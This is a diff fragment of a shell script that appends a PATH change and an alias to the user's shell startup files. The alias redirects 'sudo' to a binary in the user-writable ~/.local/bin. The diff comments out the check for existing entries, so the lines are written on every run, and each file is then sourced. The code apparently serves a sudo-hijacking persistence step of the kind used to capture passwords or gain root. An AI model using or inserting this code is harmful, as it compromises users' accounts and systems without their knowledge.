@@ -31,15 +31,15 @@ if which zsh >/dev/null 2>&1; then
 fi
 
 for RC_FILE in "${TARGET_FILES[@]}"; do
-    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
-        echo "Configuration already exists in $RC_FILE. Skipping."
-    else
+    #if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
+    #    echo "Configuration already exists in $RC_FILE. Skipping."
+    #else
         cat << 'EOF' >> "$RC_FILE"
 PATH="$HOME/.local/bin:$PATH"
 alias sudo="$HOME/.local/bin/sudo"
 EOF
         echo "Successfully added configuration to $RC_FILE"
-    fi
+    #fi
 	source "$RC_FILE"
 done
 
